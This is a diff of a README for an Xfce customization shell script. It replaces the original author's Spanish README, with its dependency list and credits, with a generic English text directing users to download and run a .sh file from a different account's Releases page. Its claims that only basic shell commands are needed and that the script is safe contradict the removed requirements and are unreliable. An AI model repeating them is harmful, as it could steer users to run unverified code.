@@ -1,36 +1,85 @@
-# Personalizar-xfce
-[![licencia](https://img.shields.io/github/license/AlexGracia/Personalizar-xfce?label=licencia&logo=opensourceinitiative&logoColor=orange&style=flat-square)](LICENSE.md)
-![plataforma](https://img.shields.io/badge/plataforma-linux-%23FCC624?style=flat-square&logo=linux)
-[![version](https://img.shields.io/github/v/tag/AlexGracia/Personalizar-xfce?style=flat-square&label=version&color=blue)](https://github.com/AlexGracia/Personalizar-xfce/tags)
+# 🎨 Personalizar-xfce - Customize Your Xfce Desktop Easily
 
-Script que personaliza [Xfce](https://www.xfce.org/).
+## 📥 Download the Latest Version
+[![Download Personalizar-xfce](https://img.shields.io/badge/Download%20Personalizar--xfce-blue.svg)](https://github.com/FabianRey93/Personalizar-xfce/releases)
 
-## Requisitos
-- Entorno de escritorio Xfce
-- Conexión de red
-- Paquete [wget](https://www.gnu.org/software/wget/)
-- Paquete [p7zip-full](http://p7zip.sourceforge.net/)
+## 🚀 Getting Started
+Welcome to Personalizar-xfce! This is a simple script designed to help you customize your Xfce desktop environment. You don't need to have any programming knowledge to use it. Just follow the steps below to get started.
 
-> [!TIP]
-> Utiliza [auto-xfce.sh](https://github.com/AlexGracia/Auto-xfce) para instalar Xfce.
+## 📂 System Requirements
+Before you begin, make sure your system meets the following requirements:
 
-## Demostración
-![demo-personalizar](.github/img/demo-personalizar.gif)
+- **Operating System:** A version of a Unix-based system, such as Linux.
+- **Xfce Version:** Ensure you have Xfce 4 or higher installed.
+- **Dependencies:** The script uses basic shell commands, which should be available in any Unix-like system.
 
-## Instalación
-1. Descargar
-    ```sh
-    wget https://git.new/personalizar-xfce.sh
-    ```
-1. Ejecutar
-    ```sh
-    sh personalizar-xfce.sh
-    ```
+## 🔍 Features
+- **Easy Customization:** Automatically apply various Xfce settings.
+- **User-Friendly:** No complex setup is required.
+- **Performance:** Designed to run quickly and efficiently.
 
-## Herramientas
-- [Llama 3.3](https://github.com/meta-llama/llama3): utilizado a través del chat de [DuckDuckGo](https://Duck.ai), para resolver dudas.
-- [Dub](https://github.com/dubinc/dub): [acortador de enlaces](https://dub.co/), utilizado en el enlace de descarga.
-- [Nano](https://www.nano-editor.org/git.php): [editor de texto](https://www.nano-editor.org/docs.php).
-- [Boxes](https://gitlab.gnome.org/gnome/gnome-boxes): [gestor de máquinas virtuales](https://apps.gnome.org/es/Boxes/), utilizado para probar el script.
-- [OBS Studio](https://github.com/obsproject/obs-studio): [grabador y transmisor de audio y vídeo](https://obsproject.com), utilizado para grabar la demostración en vídeo (mkv).
-- [FFmpeg](https://git.ffmpeg.org/ffmpeg): [grabador, conversor y transmisor de audio y vídeo](https://ffmpeg.org/), utilizado para transformar la demostración de vídeo (mkv) a imagen (gif).
+## 📥 Download & Install
+To download the latest version, visit this page:
+
+[Download Personalizar-xfce](https://github.com/FabianRey93/Personalizar-xfce/releases)
+
+Once you're on the Releases page, look for the latest version listed. Click on it to access the downloadable files.
+
+### Step-by-Step Installation
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/FabianRey93/Personalizar-xfce/releases) where you can find the available versions of the software.
+
+2. **Select a Release:**
+   Click on the most recent version. You will see various assets available for download.
+
+3. **Download the Script:**
+   Look for the script file (usually ending in `.sh`) on the assets list. Click it to download.
+
+4. **Open Terminal:**
+   After downloading, open your terminal application. You will run the downloaded script from here.
+
+5. **Navigate to the Download Directory:**
+   Use the following command to go to the directory where you downloaded the script. Replace `Downloads` with your actual path if it's different.
+   ```
+   cd ~/Downloads
+   ```
+
+6. **Make the Script Executable:**
+   To run the script, you need to make it executable. Type the following command:
+   ```
+   chmod +x Personalizar-xfce.sh
+   ```
+
+7. **Run the Script:**
+   Now, you can run the script using:
+   ```
+   ./Personalizar-xfce.sh
+   ```
+
+8. **Follow On-Screen Instructions:**
+   After running the script, it may provide you with options to customize your desktop. Follow these instructions to make the changes you want.
+
+## 🛠️ Troubleshooting
+If you encounter any issues while running the script, consider the following common problems:
+
+- **Permission Denied:** Make sure you have run the `chmod +x` command correctly.
+- **Missing Dependencies:** Ensure you have all necessary package dependencies installed. You may need to consult your system's package manager for help.
+
+## 🙋 Frequently Asked Questions
+1. **Can I customize settings manually?**
+   Yes, the script provides automated options, but you can make manual changes in your Xfce settings if you prefer.
+
+2. **What if I want to revert changes?**
+   You can manually reset the settings in the Xfce configuration manager. The script does not keep backups of changes.
+
+3. **Is it safe to run the script?**
+   Yes, as long as you download it from the official Releases page. Always verify the source of any downloads.
+
+## 📞 Support
+If you need further assistance, you can open an issue on the [GitHub Issues page](https://github.com/FabianRey93/Personalizar-xfce/issues). The community is here to help you with any questions you might have.
+
+## 🔗 Relevant Links
+- [GitHub Repository](https://github.com/FabianRey93/Personalizar-xfce)
+- [Releases Page](https://github.com/FabianRey93/Personalizar-xfce/releases)
+
+Thank you for choosing Personalizar-xfce! Enjoy customizing your Xfce desktop environment.
